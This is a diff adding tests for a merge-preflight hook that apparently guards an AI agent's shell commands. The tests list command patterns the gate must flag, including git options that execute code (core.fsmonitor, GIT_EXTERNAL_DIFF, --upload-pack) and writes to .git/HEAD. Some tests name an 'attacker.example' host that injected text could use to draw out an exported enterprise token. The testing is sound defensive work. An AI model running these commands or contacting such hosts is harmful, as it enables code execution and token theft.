@@ -137,6 +137,12 @@ def work(tmp_path: Path) -> Path:
     return path
 
 
+def _origin(work: Path, url: str) -> None:
+    """Make ``work`` a checkout whose ``origin`` is ``url`` (read locally by the host check)."""
+    subprocess.run(["git", "init", "-q", str(work)], check=True)
+    subprocess.run(["git", "-C", str(work), "remote", "add", "origin", url], check=True)
+
+
 def _run_hook(command: str, cwd: Path, **env: str) -> subprocess.CompletedProcess[str]:
     payload = {"tool_name": "Bash", "cwd": str(cwd), "session_id": "s-gate",
                "tool_input": {"command": command}}
@@ -453,6 +459,34 @@ def test_a_spent_budget_skips_the_second_call(gh: GhStub, work: Path, monkeypatc
         ('echo "$(gh pr ready 7)"; gh pr merge 7', "a command substitution before or around"),
         ("gh pr merge $PR", "a shell expansion in the merge"),
         ("gh pr merge 7 'unterminated", "an unbalanced quote"),
+        # Review round 2: compound commands, wrappers, assignments, writes, git options.
+        ("if true; then gh pr merge 42; fi", "`if` runs before the merge"),
+        ("{ gh pr merge 5; }", "a compound command around the merge"),
+        ("! gh pr merge 5", "a compound command around the merge"),
+        ("time gh pr merge 5", "a compound command around the merge"),
+        ("while true; do gh pr merge 5; done", "`while` runs before the merge"),
+        ("until false; do gh pr merge 5; done", "`until` runs before the merge"),
+        ("env --chdir=/x gh pr merge 5", "`env` wraps the merge"),
+        ("env -C /x gh pr merge 5", "`env` wraps the merge"),
+        ("sudo -D /x gh pr merge 5", "`sudo` wraps the merge"),
+        ("command gh pr merge 5", "`command` wraps the merge"),
+        ("nice -n 5 gh pr merge 5", "`nice` wraps the merge"),
+        ("timeout 5 gh pr merge 5", "`timeout` wraps the merge"),
+        ("echo 5 | xargs gh pr merge", "`xargs` wraps the merge"),
+        ("GIT_DIR=/x gh pr merge 5", "`GIT_DIR` is set for the merge"),
+        ("GIT_WORK_TREE=/x gh pr merge 5", "`GIT_WORK_TREE` is set for the merge"),
+        ("echo x > .git/HEAD; gh pr merge 7", "`echo` writes to a file before the merge"),
+        ("echo x >> notes.txt && gh pr merge 7", "`echo` writes to a file before the merge"),
+        ("git -c core.fsmonitor=x status && gh pr merge 7", "a `git` option before the merge"),
+        ("git -C /elsewhere status && gh pr merge 7", "a `git` option before the merge"),
+        ("git --git-dir=/x log && gh pr merge 7", "a `git` option before the merge"),
+        ("git log --output=f && gh pr merge 7", "a `git` option before the merge"),
+        ("git diff --ext-diff && gh pr merge 7", "a `git` option before the merge"),
+        ("git fetch --upload-pack=x && gh pr merge 7", "a `git` option before the merge"),
+        ("git push && gh pr merge 7", "`git push` runs before the merge"),
+        ("GIT_EXTERNAL_DIFF=x git diff && gh pr merge 7", "a variable set for `git diff`"),
+        ("sudo git status && gh pr merge 7", "`sudo` wraps a command before the merge"),
+        ("GIT_DIR=/x; gh pr merge 7", "a variable assignment runs before the merge"),
     ],
 )
 def test_a_merge_not_attributable_fails_open_with_why_and_calls_no_gh(
@@ -532,6 +566,13 @@ def test_no_gh_call_for_a_command_that_merges_nothing(
         ("gh pr merge 7 >>out.txt 2>&1", ["7"]),
         ("gh pr merge 7 &>log.txt", ["7"]),
         ("gh pr merge 7 >&- ", ["7"]),
+        ("gh pr merge >&- 7", ["7"]),  # closing a descriptor takes no target word
+        ("gh pr merge 2>&- 7", ["7"]),
+        ("gh pr merge 7 <<< x", ["7"]),
+        ("gh pr merge 7 0<&3 <>f", ["7"]),
+        ("gh pr \\\nmerge 7", ["7"]),  # a continuation between `pr` and `merge`
+        ("echo x > /dev/null; git --no-pager log -1; gh pr merge 7", ["7"]),
+        ("GH_TOKEN=x NO_COLOR=1 gh pr merge 7", ["7"]),
         ("gh pr merge 7 |& tee log.txt", ["7"]),
         ("gh pr merge 7 --squash # merge once green", ["7"]),
         ("gh pr merge 7 \\\n  --squash \\\n  --delete-branch", ["7"]),
@@ -570,6 +611,7 @@ def test_gh_runs_where_the_merge_runs_after_a_cd(gh: GhStub, work: Path, command
 
 
 def test_a_gh_host_prefix_is_passed_on(gh: GhStub, work: Path) -> None:
+    _origin(work, "https://ghe.example.com/acme/infra.git")
     gh.answer(view=_view(url="https://ghe.example.com/acme/infra/pull/7"))
     assert merge_preflight.merge_gate("GH_HOST=ghe.example.com gh pr merge 7", str(work)) == (
         guardrails.ALLOW
@@ -584,10 +626,81 @@ def test_auto_merge_is_held_like_a_merge(gh: GhStub, work: Path) -> None:
 
 
 def test_an_enterprise_pr_is_read_from_its_host(gh: GhStub, work: Path) -> None:
+    _origin(work, "git@ghe.example.com:acme/infra.git")  # an scp-style origin names the host too
     gh.answer(view=_view(url="https://ghe.example.com/acme/infra/pull/7"))
     assert merge_preflight.merge_gate("gh pr merge 7", str(work)) == guardrails.ALLOW
     graphql = gh.calls()[1]
     assert graphql[:4] == ["api", "graphql", "--hostname", "ghe.example.com"]
+
+
+def test_the_graphql_read_always_names_the_resolved_host(gh: GhStub, work: Path) -> None:
+    """Review round 2 (codex): with a GH_HOST for the merge and a github.com URL, `gh pr view`
+    resolved the public PR while the GraphQL read, given no --hostname, followed GH_HOST to
+    another host and so another PR."""
+    _origin(work, "https://ghe.example.com/acme/infra.git")
+    command = "GH_HOST=ghe.example.com gh pr merge https://github.com/acme/infra/pull/7"
+    assert merge_preflight.merge_gate(command, str(work)) == guardrails.ALLOW
+    view, graphql = gh.calls()
+    assert view[:3] == ["pr", "view", "https://github.com/acme/infra/pull/7"]
+    assert graphql[:4] == ["api", "graphql", "--hostname", "github.com"]
+
+
+def test_github_com_is_named_too(gh: GhStub, work: Path) -> None:
+    assert merge_preflight.merge_gate("gh pr merge 7", str(work)) == guardrails.ALLOW
+    assert gh.calls()[1][:4] == ["api", "graphql", "--hostname", "github.com"]
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "gh pr merge https://attacker.example/o/r/pull/1",
+        "gh pr merge -R attacker.example/o/r 1",
+        "GH_HOST=attacker.example gh pr merge 1",
+        "GH_HOST=ghe.example.com gh pr merge 1",  # the origin below is github.com
+    ],
+)
+def test_a_host_the_command_names_is_not_contacted(gh: GhStub, work: Path, command: str) -> None:
+    """The hook runs before the permission prompt: a host named by injected text must not be
+    called, with whatever enterprise token is exported, even if the operator then denies."""
+    _origin(work, "https://github.com/acme/infra.git")
+    notice = _notice(_run_hook(command, work, GH_ENTERPRISE_TOKEN="secret-token"))
+    assert "neither github.com nor this checkout's origin" in notice
+    assert "attacker" not in notice and "secret" not in notice
+    assert gh.calls() == []
+
+
+def test_the_host_of_the_checkouts_origin_is_contacted(gh: GhStub, work: Path) -> None:
+    _origin(work, "ssh://git@GHE.example.com:2222/acme/infra.git")
+    gh.answer(view=_view(url="https://ghe.example.com/acme/infra/pull/7"))
+    assert merge_preflight.merge_gate(
+        "gh pr merge https://ghe.example.com/acme/infra/pull/7", str(work)
+    ) == guardrails.ALLOW
+    assert len(gh.calls()) == 2
+
+
+def test_no_origin_allows_github_com_only(gh: GhStub, work: Path) -> None:
+    with pytest.raises(merge_preflight.GateUnavailable, match="neither github.com"):
+        merge_preflight.merge_gate("gh pr merge -R ghe.example.com/a/b 1", str(work))
+    assert gh.calls() == []
+
+
+def test_a_pr_resolved_on_another_host_is_not_read(gh: GhStub, work: Path) -> None:
+    """No host in the command, but `gh` resolved the PR elsewhere (another remote, an ambient
+    GH_HOST): the GraphQL read is not sent there."""
+    _origin(work, "https://github.com/acme/infra.git")
+    gh.answer(view=_view(url="https://elsewhere.example/acme/infra/pull/7"))
+    with pytest.raises(merge_preflight.GateUnavailable, match="found the PR on a host"):
+        merge_preflight.merge_gate("gh pr merge 7", str(work))
+    assert len(gh.calls()) == 1
+
+
+def test_an_unreadable_origin_reads_as_none(gh: GhStub, work: Path, monkeypatch) -> None:
+    def stalled(*_args: object, **_kwargs: object) -> str:
+        raise subprocess.TimeoutExpired(["git"], 1)
+
+    monkeypatch.setattr(merge_preflight, "_git", stalled)
+    assert merge_preflight._origin_host(str(work), time.monotonic() + 5) == ""
+    assert merge_preflight._origin_host(str(work), time.monotonic() - 1) == ""
 
 
 def test_a_cd_to_a_missing_directory_fails_open(gh: GhStub, work: Path) -> None:
@@ -633,6 +746,10 @@ def test_the_budgets_fit_inside_the_hooks_timeout() -> None:
         ("gh pr merge 1 && (cd x; ls)", guardrails.MergeTarget("1", "", "/w")),
         ("echo hi", None),
         ("gh pr view 7 | cat", None),
+        ("gh pr merge 7 >&- && echo x > /dev/null", guardrails.MergeTarget("7", "", "/w")),
+        ("echo x 2>/dev/null; gh pr merge 7 <<< y", guardrails.MergeTarget("7", "", "/w")),
+        ("sudo -u", None),
+        ("then echo gh pr merge", None),
         ("git status && cd /x && gh pr merge 1", guardrails.MergeTarget("1", "", "/x")),
         ('gh pr merge 7 -b "say \\"hi\\" for \\$5" -t a\\ b',
          guardrails.MergeTarget("7", "", "/w")),
@@ -661,6 +778,19 @@ def test_pr_merge_target(command: str, expected: guardrails.MergeTarget | None) 
         ('gh pr merge "$(gh pr list -q .[0])"', "a command substitution before or around"),
         ('gh pr merge "pr-$N"', "a shell expansion in the merge"),
         ("echo $(date)", "a command substitution before or around"),  # what follows is unread
+        # Review round 2, pure: wrappers, compound commands, writes, git options and prefixes.
+        ("{ gh pr merge 5; }", "a compound command around the merge"),
+        ("sudo env gh pr merge 5", "`sudo` wraps the merge"),
+        ("env -C /x gh pr merge 5", "`env` wraps the merge"),
+        ("GIT_DIR=/x gh pr merge 5", "`GIT_DIR` is set for the merge"),
+        ("echo x > .git/HEAD; gh pr merge 7", "`echo` writes to a file before the merge"),
+        ("echo x &> log; gh pr merge 7", "`echo` writes to a file before the merge"),
+        ("git -c core.fsmonitor=x status && gh pr merge 7", "a `git` option before the merge"),
+        ("git log --output=f && gh pr merge 7", "a `git` option before the merge"),
+        ("git --no-pager && gh pr merge 7", "`git --no-pager` runs before the merge"),
+        ("git checkout x && gh pr merge 7", "`git checkout` runs before the merge"),
+        ("GIT_EXTERNAL_DIFF=x git diff && gh pr merge 7", "a variable set for `git diff`"),
+        ("sudo git status && gh pr merge 7", "`sudo` wraps a command before the merge"),
         ("echo x && cd /x; gh pr merge 1", "a `cd` that may not take effect"),
         ("GH_CONFIG_DIR=/x gh pr merge 1", "`GH_CONFIG_DIR` is set for the merge"),
         ("GH_HOST='a b' gh pr merge 1", "`GH_HOST` is not a host name"),
